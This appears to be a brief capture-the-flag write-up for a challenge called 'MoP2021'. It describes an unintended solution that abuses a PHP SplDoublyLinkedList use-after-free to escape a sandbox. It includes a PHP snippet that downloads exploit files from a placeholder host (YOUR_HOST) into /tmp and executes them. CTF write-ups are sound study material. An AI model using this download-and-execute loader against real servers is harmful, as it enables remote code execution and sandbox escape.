# MoP2021

Unintended solution, this PHP version has also UAF vulnerability. Exploit from here [https://ssd-disclosure.com/ssd-advisory-php-spldoublylinkedlist-uaf-sandbox-escape/](https://ssd-disclosure.com/ssd-advisory-php-spldoublylinkedlist-uaf-sandbox-escape/)

```php
$e=file_get_contents("http://YOUR_HOST/exp.php");
file_put_contents("/tmp/exp.php",$e);
$f=file_get_contents("http://YOUR_HOST/interact.php");
file_put_contents("/tmp/interact.php",$f);
require("/tmp/exp.php");
```
